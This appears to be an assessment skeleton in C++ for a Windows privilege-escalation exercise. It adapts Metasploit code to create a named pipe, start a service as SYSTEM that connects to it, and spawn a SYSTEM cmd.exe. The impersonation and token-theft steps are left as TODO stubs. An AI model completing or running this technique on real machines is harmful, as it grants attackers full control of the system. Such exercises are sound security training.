#include "namedPipeImpersonation.h"

#include <iostream>
#include <thread>

#include <winnt.h>              // SecurityImpersonation, TokenPrimary, OSVERSIONINFO
#include <processthreadsapi.h>  // CreateThread, GetCurrentThread
#include <winbase.h>            // CreateNamedPipeA, CreateProcessWithTokenW
#include <errhandlingapi.h>     // GetLastError
#include <namedpipeapi.h>
#include <securitybaseapi.h>

#include "service.h"

using namespace std;

/*
 * Modified code from metasploit that creates a service to connect to our named pipe as the client.
 * Sources:
 *  - https://github.com/rapid7/meterpreter/blob/d338f702ce8cb7f4e550f005ececaf5f3cadd2bc/source/extensions/priv/server/elevate/namedpipe.c#L92
 */
DWORD CreateNPClient(const char * kPipeName) {
    DWORD dw_result                           = ERROR_SUCCESS;
    char * cp_service_name                    = const_cast<char*>(kPipeName);
    char service_args[MAX_PATH]               = {0};
    char service_pipe[MAX_PATH]               = {0};
    OSVERSIONINFO os;

    os.dwOSVersionInfoSize = sizeof(OSVERSIONINFO);

    if (!GetVersionEx(&os)) {
        BREAK_ON_ERROR("[CLIENT THREAD] ERROR: elevate_via_service_namedpipe: GetVersionEx failed");
        return dw_result;
    }

    // Filter out Windows NT4
    if (os.dwMajorVersion == 4 && os.dwMinorVersion == 0) {
        BREAK_ON_ERROR("[CLIENT THREAD] ERROR: elevate_via_service_namedpipe: Windows NT4 not supported.");
        return dw_result;
    }

    _snprintf_s(
        service_pipe,
        sizeof(service_pipe),
        MAX_PATH,
        "\\\\.\\pipe\\%s",
        cp_service_name);
    _snprintf_s(
        service_args,
        sizeof(service_args),
        MAX_PATH,
        "cmd.exe /c echo %s > %s",
        cp_service_name,
        service_pipe);

    if (ServiceStart(cp_service_name) != ERROR_SUCCESS) {
        cout << "[CLIENT THREAD] service starting failed, attempting to create" << endl;
        if (ServiceCreate(cp_service_name, service_args) != ERROR_SUCCESS) {
            BREAK_ON_ERROR("[CLIENT THREAD] ERROR: elevate_via_service_namedpipe. ServiceCreate failed");
            return dw_result;
        }
        cout << "[CLIENT THREAD] creation of service succeeded, attempting to start" << endl;
        // We don't check a return value for ServiceStart as we expect it to
        // fail as cmd.exe is not a valid service and it will never signal to
        // the service manager that is is a running service.
        ServiceStart(cp_service_name);
    }
    return dw_result;
}

/*
 * Creates a named pipe and a client thread that connects to the pipe using a
 * system service. After the client writes to the pipe, the server thread can
 * read from the pipe, preparing it for impersonation.
 * Returns NULL if failure encountered, otherwise returns handle to pipe.
 * Sources:
 *  - https://github.com/rapid7/meterpreter/blob/d338f702ce8cb7f4e550f005ececaf5f3cadd2bc/source/extensions/priv/server/elevate/namedpipe.c#L9
 *  - https://www.ired.team/offensive-security/privilege-escalation/t1134-access-token-manipulation
 *  - https://github.com/slyd0g/PrimaryTokenTheft/blob/master/main.cpp
 */
HANDLE CreateNamedPipeAndConnectClient() {
    const char* kPipePrefix = "\\\\.\\pipe\\";
    const char* kPipeName   = "shamoon-exploit-pipe";
    HANDLE h_pipe           = NULL;
    BYTE byte_message[128]  = {0};
    DWORD dw_bytes          = 0;
    char * full_pipe_path   = new char[strlen(kPipePrefix) + strlen(kPipeName) + 1];

    memcpy(full_pipe_path, kPipePrefix, strlen(kPipePrefix));
    memcpy(full_pipe_path + strlen(kPipePrefix), kPipeName, strlen(kPipeName));
    full_pipe_path[strlen(kPipePrefix) + strlen(kPipeName)] = '\0';

    cout << "[+] Creating named pipe " << full_pipe_path << endl;

    h_pipe = CreateNamedPipe(
        full_pipe_path,
        PIPE_ACCESS_DUPLEX,
        PIPE_TYPE_MESSAGE|PIPE_WAIT,
        1,
        0,
        0,
        0,
        NULL);
    if (!h_pipe) {
        cout << "[!] ERROR: CreateNamedPipe() failed" << endl;
        return NULL;
    }
    delete full_pipe_path;

    // Create service thread that will connect to the pipe on the client side.
    thread clientThread(CreateNPClient, kPipeName);

    // Wait for the service to connect to our named pipe.
    if (!ConnectNamedPipe(h_pipe, NULL)) {
        cout << "[!] ERROR: ConnectNamedPipe() failed: " << GetLastError() << endl;
        return NULL;
    }
    cout << "[+] Receieved a client connection" << endl;
    
    // Client impersonation first requires a read on the server side.
    if (!ReadFile(h_pipe, &byte_message, 1, &dw_bytes, NULL)) {
        DisconnectNamedPipe(h_pipe);
        cout << "[!] ERROR: ReadFile() failed: " << GetLastError() << endl;
        return NULL;
    }

    cout << "[+] Waiting for worker thread to close..." << endl;
    clientThread.join();
    return h_pipe;
}

/*
 * Performs named pipe client impersonation, and elevates to SYSTEM.
 * Returns 0 if successful, -1 otherwise.
 */
bool ElevateToSystem(HANDLE h_pipe) {
    if (!h_pipe) {
        cout << "[!] ERROR: invalid namedpipe. Exiting ElevateToSystem()" << endl;
        return false;
    }

    /*
     ******************************* TODO: *******************************
     * Assessment step 4: 
     *     Impersonate SYSTEM security context using named pipe client
     *     impersonation.
     */

    char post_npc_impersonation_username[256];
    DWORD dw_npc_username = 256;
    GetUserNameA(post_npc_impersonation_username, &dw_npc_username);
    cout << "[*] Post-NPC USERNAME: " << post_npc_impersonation_username << endl;

}

/*
 * Uses the thread token to open a new SYSTEM cmd.exe shell.
 * Returns 0 if successful, -1 otherwise.
 */
int CreateSystemShell() {
    HANDLE system_token = INVALID_HANDLE_VALUE;
    HANDLE duplicate_token_handle = INVALID_HANDLE_VALUE;

    STARTUPINFOW startup_info;
    PROCESS_INFORMATION process_information;
    ZeroMemory(&startup_info, sizeof(STARTUPINFO));
    ZeroMemory(&process_information, sizeof(PROCESS_INFORMATION));

    /*
     ******************************* TODO: *******************************
     * Assessment step 5: 
     *     Get the SYSTEM token from the calling thread. It should be a primary token.
     *     The token will then be used below in CreateProcessWithTokenW() to start a
     *     cmd.exe instance.
     * 
     */

    if (!CreateProcessWithTokenW(system_token, LOGON_WITH_PROFILE,
                                 L"C:\\Windows\\System32\\cmd.exe", NULL, 0, NULL, NULL,
                                 &startup_info, &process_information)) {
        cout << "[!] ERROR: CreateProcessWithToken() failed: " << GetLastError() << endl;
    }
    cout << "[+] CreateProcessWithTokenW() success, Process spawned!" << endl;
}
